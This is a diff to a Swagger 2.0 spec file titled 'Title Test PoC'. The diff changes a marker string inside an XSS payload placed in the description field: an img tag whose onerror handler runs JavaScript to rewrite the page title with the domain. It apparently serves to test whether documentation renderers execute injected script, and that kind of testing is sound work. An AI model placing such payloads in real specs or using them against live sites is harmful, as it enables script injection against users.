@@ -1,6 +1,6 @@
 swagger: "2.0"
 info:
   title: "Title Test PoC"
-  description: '<img src=x onerror="document.title=`XSS-PWNED-${document.domain}`">'
+  description: '<img src=x onerror="document.title=`XSS-PWnd-${document.domain}`">'
   version: "1.0.0"
 paths: {}
